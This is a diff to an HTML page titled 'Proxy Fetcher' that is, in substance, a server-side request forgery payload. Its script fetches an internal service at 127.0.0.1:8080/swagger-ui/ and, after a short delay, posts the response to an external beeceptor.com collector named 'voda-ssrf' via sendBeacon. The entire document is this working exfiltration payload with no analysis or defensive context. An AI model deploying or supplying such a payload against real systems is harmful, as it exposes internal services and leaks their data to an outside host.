@@ -1,9 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>Proxy Fetcher</title></head>
+<body>
 <script>
-async function sendInternalTraffic() {
-    const response = await fetch("http://127.0.0.1:8080/swagger-ui/");
-    const body = await response.text();
-    navigator.sendBeacon("https://voda-ssrf.free.beeceptor.com", body);
-}
-sendInternalTraffic();
+async function sendDataOut() {
+    try {
+        const res = await fetch('http://127.0.0.1:8080/swagger-ui/');
+        const textData = await res.text();
 
+        // Send data OUTSIDE using beacon
+        navigator.sendBeacon(
+          'https://voda-ssrf.free.beeceptor.com',
+          textData
+        );
+    } catch(e) {
+        console.log('Failed:', e);
+    }
+}
+
+// Run with delay to make sure backend catches it
+setTimeout(sendDataOut, 1000);
 </script>
+Done...
+</body>
+</html>
